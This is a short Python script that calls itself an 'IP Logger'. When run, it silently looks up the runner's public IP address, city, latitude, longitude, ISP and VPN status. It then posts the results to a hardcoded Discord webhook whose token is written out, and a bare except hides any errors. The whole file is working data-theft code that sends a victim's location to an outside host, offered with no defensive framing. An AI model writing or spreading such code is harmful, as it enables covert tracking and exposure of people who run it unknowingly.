import requests

webhook = "https://discord.com/api/webhooks/973962006501666816/yb5KuGCsijex9nY66xkWxRsUbYLWsnHJOYfauEFT0L6ExWwIjTPkopqclxUjJlbLqZBJ"

def ip():
  try:
    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
    data = requests.get(api).json()
    content = f"**IP Logger**: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']}**"
    requests.post(webhook, json={"avatar_url":"https://iconarchive.com/download/i83612/pelfusion/flat-file-type/log.ico",'username': 'IPLogger - Created by: AkhilRaghav0', 'content': content})
  except:
    pass

ip()
